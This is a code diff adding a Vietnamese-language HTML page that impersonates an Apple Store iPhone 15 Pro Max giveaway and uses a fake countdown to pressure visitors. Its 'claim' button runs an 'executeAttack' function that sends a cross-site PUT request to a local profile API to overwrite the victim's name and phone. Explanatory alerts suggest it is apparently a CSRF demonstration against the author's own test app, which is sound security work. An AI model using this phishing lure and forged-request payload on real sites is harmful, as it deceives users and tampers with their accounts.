@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>QUÀ TẶNG ĐẶC BIỆT TỪ APPLE STORE</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f5f5f7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 400px;
+            animation: fadeIn 1s ease-in;
+        }
+        h1 {
+            color: #1d1d1f;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        .prize-img {
+            width: 80%;
+            margin: 20px 0;
+            transition: transform 0.3s;
+        }
+        .prize-img:hover {
+            transform: scale(1.05);
+        }
+        p {
+            color: #86868b;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        .highlight {
+            color: #0071e3;
+            font-weight: bold;
+        }
+        .btn-claim {
+            background-color: #0071e3;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 980px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 20px;
+            transition: background-color 0.3s;
+            font-weight: 500;
+        }
+        .btn-claim:hover {
+            background-color: #0077ed;
+            box-shadow: 0 4px 12px rgba(0,113,227,0.3);
+        }
+        .timer {
+            color: #d32f2f;
+            font-weight: bold;
+            margin-top: 15px;
+            font-size: 14px;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Apple_logo_black.svg/800px-Apple_logo_black.svg.png" alt="Apple" style="width: 30px; margin-bottom: 10px;">
+        
+        <h1>Chúc mừng bạn! 🎉</h1>
+        
+        <p>Bạn là khách hàng may mắn thứ <strong>#999</strong> của StoryVerse.</p>
+        <p>Phần thưởng của bạn là một chiếc <span class="highlight">iPhone 15 Pro Max 256GB</span> màu Titan Tự Nhiên.</p>
+
+        <img src="https://store.storeimages.cdn-apple.com/4982/as-images.apple.com/is/iphone-15-pro-finish-select-202309-6-7inch-naturaltitanium?wid=5120&hei=2880&fmt=p-jpg&qlt=80&.v=1692846363027" alt="iPhone 15 Pro Max" class="prize-img">
+
+        <p class="timer">Ưu đãi kết thúc sau: <span id="countdown">05:00</span></p>
+
+        <button class="btn-claim" onclick="executeAttack()">NHẬN QUÀ NGAY</button>
+        
+        <p style="font-size: 11px; margin-top: 20px; color: #aaa;">*Điều khoản và điều kiện áp dụng.</p>
+    </div>
+
+    <script>
+        // Tạo đồng hồ đếm ngược để gây áp lực tâm lý (Fake Urgency)
+        let time = 300; // 5 phút
+        setInterval(() => {
+            const minutes = Math.floor(time / 60);
+            let seconds = time % 60;
+            seconds = seconds < 10 ? '0' + seconds : seconds;
+            document.getElementById('countdown').innerHTML = `0${minutes}:${seconds}`;
+            time--;
+        }, 1000);
+
+        // HÀM TẤN CÔNG CHÍNH
+        function executeAttack() {
+            // Thay đổi giao diện nút để người dùng tưởng đang xử lý
+            const btn = document.querySelector('.btn-claim');
+            btn.innerHTML = "Đang xử lý...";
+            btn.style.backgroundColor = "#ccc";
+            btn.disabled = true;
+
+            const targetUrl = 'http://localhost:3000/api/users/profile'; 
+
+            fetch(targetUrl, {
+                method: 'PUT',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    fullName: "HACKED BY IPHONE 15 SCAM", 
+                    phone: "0123456789"
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("CHÚC MỪNG! Chúng tôi đã nhận được thông tin. (Thực tế: Bạn đã bị hack đổi tên!)");
+                } else {
+                    alert("Rất tiếc! Hệ thống đang bảo trì. (Thực tế: Tấn công thất bại - Web an toàn)");
+                    console.log("Status Code:", response.status);
+                }
+            })
+            .catch(err => {
+                alert("Lỗi kết nối! (Thực tế: Bị chặn bởi CORS)");
+                console.log(err);
+            })
+            .finally(() => {
+                btn.innerHTML = "NHẬN QUÀ NGAY";
+                btn.style.backgroundColor = "#0071e3";
+                btn.disabled = false;
+            });
+        }
+    </script>
+</body>
+</html>
